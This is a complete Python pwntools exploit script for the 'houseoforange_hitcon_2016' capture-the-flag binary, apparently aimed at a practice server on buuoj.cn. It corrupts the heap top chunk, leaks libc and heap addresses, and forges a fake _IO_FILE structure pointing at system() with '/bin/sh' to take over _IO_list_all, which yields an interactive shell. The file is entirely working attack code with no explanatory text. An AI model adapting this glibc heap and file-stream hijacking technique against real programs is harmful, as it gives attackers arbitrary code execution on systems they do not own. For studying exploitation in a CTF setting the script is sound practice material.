#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/10 19:41:46
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('houseoforange_hitcon_2016')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node3.buuoj.cn'
    port = 27759
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('houseoforange_hitcon_2016')

def cmd(choice):
    sh.recvuntil("Your choice : ")
    sh.sendline(str(choice))

def add(size,name,price,color):
    cmd(1)
    sh.recvuntil("Length of name :")
    sh.sendline(str(size))
    sh.recvuntil("Name :")
    sh.send(name)
    sh.recvuntil("Price of Orange:")
    sh.sendline(str(price))
    sh.recvuntil("Color of Orange:")
    sh.sendline(str(color))

def show():
    cmd(2)

def edit(size,name,price,color):
    cmd(3)
    sh.recvuntil("Length of name :")
    sh.sendline(str(size))
    sh.recvuntil("Name:")
    sh.send(name)
    sh.recvuntil("Price of Orange: ")
    sh.sendline(str(price))
    sh.recvuntil("Color of Orange: ")
    sh.sendline(str(color))

add(0x30,"eur1ka",666,0xddaa)
payload = 'a' * 0x30 + p64(0) + p64(0x21) + p32(666) + p32(0xddaa) + p64(0) * 2 + p64(0xf81)
edit(len(payload),payload,666,0xddaa)
add(0x1000,"a\n",666,0xddaa)
add(0x400,'a'*8,666,0xddaa)
show()
sh.recvuntil("aaaaaaaa")

libc_base = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3c5188
log.info("Success leak libc_base:0x%x"%libc_base)
# gdb.attach(sh)
# pause()
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + one_offset[0]
system_addr = libc_base + libc.symbols['system']
IO_list_all = libc_base + libc.symbols['_IO_list_all']
edit(0x10,"b" * 0x10,666,0xddaa)
show()
sh.recvuntil("bbbbbbbbbbbbbbbb")
heap_base = u64(sh.recv(6).ljust(8,"\x00")) - 0xe0
log.info("Success leak heap_base:0x%x"%heap_base)
payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(666) + p32(0xddaa) + p64(0)
fake_file = "/bin/sh\x00" + p64(0x61) + p64(0) + p64(IO_list_all-0x10) + p64(0) + p64(1)
fake_file = fake_file.ljust(0xc0,"\x00")
fake_file += p64(0) *3
fake_file += p64(heap_base + 0x5e8)
fake_file += p64(0) * 2
fake_file += p64(system_addr)
payload += fake_file
edit(len(payload),payload,666,0xddaa)
gdb.attach(sh)
pause()
cmd(1)
sh.interactive()
